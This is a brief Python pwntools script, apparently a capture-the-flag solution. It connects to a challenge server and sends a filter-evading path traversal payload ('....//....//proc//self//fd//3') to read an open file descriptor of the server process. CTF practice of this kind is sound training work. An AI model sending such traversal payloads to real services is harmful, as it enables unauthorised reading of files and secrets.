from pwn import remote
# nc kubenode.mctf.io 31006
r = remote('kubenode.mctf.io', 31006)
r.sendlineafter(b'Archives): ', b'....//....//....//proc//self//fd//3') # :p
print(r.recvline())